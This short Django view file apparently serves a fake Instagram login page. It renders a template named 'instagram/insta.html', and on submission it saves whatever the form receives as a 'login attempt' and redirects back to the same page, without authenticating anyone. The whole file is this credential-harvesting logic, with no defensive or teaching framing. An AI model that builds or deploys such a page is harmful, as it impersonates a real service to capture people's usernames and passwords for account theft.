
from django.shortcuts import render, redirect
from .forms import LoginForm

def login_view(request):
    form = LoginForm()

    if request.method == 'POST':
        form = LoginForm(request.POST)
        if form.is_valid():
            form.save()  # Save login attempt
            return redirect('login')  # Redirect or show success

    return render(request, 'instagram/insta.html', {'form': form})
